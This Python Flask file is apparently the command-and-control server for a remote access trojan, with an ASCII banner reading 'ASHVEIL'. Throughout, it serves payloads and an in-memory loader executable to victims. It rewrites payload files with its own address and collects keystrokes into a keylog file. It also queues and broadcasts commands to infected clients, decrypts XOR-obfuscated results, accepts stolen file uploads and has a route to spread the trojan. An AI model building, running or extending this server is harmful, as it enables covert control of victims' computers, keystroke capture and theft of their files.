from flask import Flask, request, send_from_directory, jsonify, Response, render_template
import os
import time
from blessed import Terminal
import socket
import signal
import atexit


app = Flask(__name__)

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
CODE_DIR = os.path.join(CURRENT_DIR, "payloads")
UPLOAD_DIR = os.path.join(CURRENT_DIR, "uploads")
FILE_NAME = 'InMemLoader.exe'
clean_name = 'clean.bat'
forwarded = False
EXE_DIR = r''
MEM_DIR = r''
port = 7777

os.makedirs(CODE_DIR, exist_ok=True)
os.makedirs(UPLOAD_DIR, exist_ok=True)

available_code_files = [f for f in os.listdir(CODE_DIR) if os.path.isfile(os.path.join(CODE_DIR, f))]
selected_code_file = None

# pages
@app.route('/')
def home():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

def info(message):
    os.system('cls' if os.name == 'nt' else 'clear')
    print(" ░█████╗░░██████╗██╗░░██╗██╗░░░██╗███████╗██╗██╗░░░░░")
    print("  ██╔══██╗██╔════╝██║░░██║██║░░░██║██╔════╝██║██║░░░░░")
    print("  ███████║╚█████╗░███████║╚██╗░██╔╝█████╗░░██║██║░░░░░")
    print("  ██╔══██║░╚═══██╗██╔══██║░╚████╔╝░██╔══╝░░██║██║░░░░░")
    print("  ██║░░██║██████╔╝██║░░██║░░╚██╔╝░░███████╗██║███████╗")
    print("  ╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝╚══════╝")
    if (message == ''):
        return True
    else:
       print("==========  " + f"{message}" + "  =========")
    time.sleep(0.5)


def adjust_payload():
    global forwarded, available_code_files
    # Get the public IP or local IP based on the forwarded flag
    ip_address = "127.0.0.1"  # default local IP
    if forwarded:
        ip_address = socket.gethostbyname(socket.gethostname())  # Get the local machine IP

    # Iterate through all payload files in the directory
    for file_name in available_code_files:
        file_path = os.path.join(CODE_DIR, file_name)

        # Read the file and replace the URL
        with open(file_path, "r") as file:
            content = file.read()

        # Modify the URL in the selected code file
        new_content = content.replace("URL_PLACEHOLDER", f"http://{ip_address}:{port}")

        # Write the changes back to the file
        with open(file_path, "w") as file:
            file.write(new_content)

        print(f"[*] Adjusted URL in {file_name} to {ip_address}")

def revert_payloads():
    global forwarded, available_code_files
    ip_address = "127.0.0.1"
    if forwarded:
        ip_address = socket.gethostbyname(socket.gethostname())

    for file_name in available_code_files:
        file_path = os.path.join(CODE_DIR, file_name)
        with open(file_path, "r") as file:
            content = file.read()

        new_content = content.replace(f"http://{ip_address}:{port}", "URL_PLACEHOLDER")

        with open(file_path, "w") as file:
            file.write(new_content)

        print(f"[*] Reverted URL in {file_name} to placeholder")

def handle_shutdown(signum, frame):
    print("\n[*] Caught shutdown signal. Cleaning up...")
    revert_payloads()
    print("[*] Cleanup complete. Exiting.")
    os.system('cls' if os.name == 'nt' else 'clear')
    info("hope to see you again soon :)")
    exit(0)

# Register handlers for SIGINT (Ctrl+C) and SIGTERM
signal.signal(signal.SIGINT, handle_shutdown)
signal.signal(signal.SIGTERM, handle_shutdown)

# Optional: Also register with atexit for non-signal exits
atexit.register(revert_payloads)


def ask_if_forwarded():
    global forwarded  # Make sure we're modifying the global variable
    # print("Do you have your port open?")
    term = Terminal()

    menu = ['Yes', 'No', 'Exit']
    selected = 0
    forwarded = None  # Initialize the variable

    with term.fullscreen(), term.cbreak(), term.hidden_cursor():
        print(term.clear)      
        while True:
            print(term.move_yx(0, 0) + term.bold("==== Do you have a forwarded port (7777)? ====\n"))
            for i, item in enumerate(menu):
                if i == selected:
                    print(term.underline + item + term.normal)
                else:
                    print(item)

            key = term.inkey()

            if key.name == 'KEY_UP' and selected > 0:
                selected -= 1
            elif key.name == 'KEY_DOWN' and selected < len(menu) - 1:
                selected += 1
            elif key.name == 'KEY_ENTER' or key == '\n':
                # Process the selection
                if menu[selected] == 'Yes':
                    forwarded = True
                elif menu[selected] == 'No':
                    forwarded = False
                elif menu[selected] == 'Exit':
                    print(term.move_yx(0, len(menu) + 1) + "Exiting...")
                    break  # Exit the loop and function

                # Once an option is selected, break the loop
                break

        # If 'Exit' is selected, we exit out of the program.
        if forwarded is None:
            print("No selection made. Exiting...")
            exit(0)  # Exit the program if no selection is made

@app.route('/download', methods=['GET'])
def download_exe():
    filename = 'install.exe'
    file_path = os.path.join(EXE_DIR, filename)
    if os.path.exists(file_path):
        return send_from_directory(EXE_DIR, filename, as_attachment=True)
    else:
        return "install.exe not found", 404

@app.route('/InMemLoader.exe', methods=['GET'])
def download_memloader():
    filename = 'InMemLoader.exe'
    file_path = os.path.join(MEM_DIR, filename)
    if os.path.exists(file_path):
        return send_from_directory(MEM_DIR, filename, as_attachment=True)
    else:
        return "InMemLoader.exe not found", 404


# ==== Interactive Blessed Menu ====
def choose_code_file():
    global selected_code_file
    term = Terminal()
    index = 0

    menu_files = available_code_files + ['[ Exit ]']

    if not available_code_files:
        print("[-] No payloads found in /payload folder. Please add payloads first.")
        exit(1)

    with term.fullscreen(), term.cbreak(), term.hidden_cursor():
        print(term.clear)
        while True:
            print(term.move_yx(0, 0) + term.bold("==== Select a payload ====\n"))
            for i, file in enumerate(menu_files):
                if i == index:
                    print(term.reverse(file))
                else:
                    print(file)

            key = term.inkey()

            if key.name == 'KEY_UP':
                index = (index - 1) % len(menu_files)
            elif key.name == 'KEY_DOWN':
                index = (index + 1) % len(menu_files)
            elif key.name in ('KEY_ENTER', '\n'):
                selected = menu_files[index]
                if selected == '[ Exit ]':
                    print(term.clear + "[*] Exiting...")
                    time.sleep(0.5)
                    exit(0)
                else:
                    selected_code_file = selected
                    print(term.clear + f"[+] Selected: {selected_code_file}")
                    time.sleep(1)
                    break


# ==== Flask Routes ====
@app.route("/code")
def serve_code():
    if not selected_code_file:
        return "No code file selected.", 500
    try:
        with open(os.path.join(CODE_DIR, selected_code_file), 'r', encoding='utf-8') as f:
            return Response(f.read(), mimetype='text/plain')
    except Exception as e:
        return f"Error reading file: {str(e)}", 500


@app.route('/install', methods=['GET'])
def download_v2():
    try:
        file_path = os.path.join(CURRENT_DIR, FILE_NAME)
        if not os.path.exists(file_path):
            return jsonify({'status': 'error', 'message': f'{FILE_NAME} not found on the server.'}), 404
        return send_from_directory(CURRENT_DIR, FILE_NAME, as_attachment=True)
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/clean', methods=['GET'])
def clean():
    try:
        file_path = os.path.join(CURRENT_DIR, clean_name)
        if not os.path.exists(file_path):
            return jsonify({'status': 'error', 'message': f'{clean_name} not found on the server.'}), 404
        return send_from_directory(CURRENT_DIR, clean_name, as_attachment=True)
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

def xor(data, key="nullbeacon"):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

# ==== Client State ====
clients = {}
current_cmd = ""
last_result = ""

@app.route('/log', methods=['POST'])
def log():
    raw_data = request.form.get("data", "")
    
    # Just log the raw data without timestamp
    with open("keylog.log", "a", encoding="utf-8") as f:
        f.write(raw_data)  # Ensure no extra newline is added here

    return "OK", 200

@app.route('/client_info', methods=['POST'])
def update_client_info():
    client_id = request.data.decode()
    clients[client_id] = {"ip": request.remote_addr, "last_seen": time.time()}
    print(f"[*] Client {client_id} updated or connected.")
    return "OK"


@app.route('/get', methods=['GET'])
def get_command():
    return current_cmd


@app.route('/set', methods=['POST'])
def set_command():
    global current_cmd
    current_cmd = request.data.decode()
    return "OK"


@app.route('/result', methods=['POST'])
def post_result():
    global last_result
    encrypted = request.data.decode()
    last_result = xor(encrypted)
    return "OK"


@app.route('/last', methods=['GET'])
def get_last_result():
    return last_result or "[*] No result yet."


@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files.get('file')
    if file:
        path = os.path.join(UPLOAD_DIR, file.filename)
        file.save(path)
        print(f"[+] File uploaded: {file.filename}")
        return "OK"
    return "No file"


@app.route('/broadcast', methods=['POST'])
def broadcast_command():
    global current_cmd
    cmd = request.data.decode()
    current_cmd = cmd
    print(f"[!] Broadcasting command to all clients: {cmd}")
    return "Broadcast sent"


@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    try:
        return send_from_directory(UPLOAD_DIR, filename, as_attachment=True)
    except Exception:
        return "File not found", 404


@app.route('/spread', methods=['POST'])
def spread():
    print("[*] Command received to spread RAT to all clients.")
    for client_id, client_data in clients.items():
        print(f"[+] Sending 'spread' command to {client_id} at {client_data['ip']}")
    return "Spreading started."


@app.route('/clients', methods=['GET'])
def list_clients():
    return {"clients": list(clients.keys())}

# ==== Run Server ====
if __name__ == "__main__":

    info('')
    ask_if_forwarded()  # Ask if port is forwarded
    adjust_payload()  # Adjust all payload files based on forwarding status
    choose_code_file()  # Let the user choose a payload file
    app.run(host="0.0.0.0", port=port)
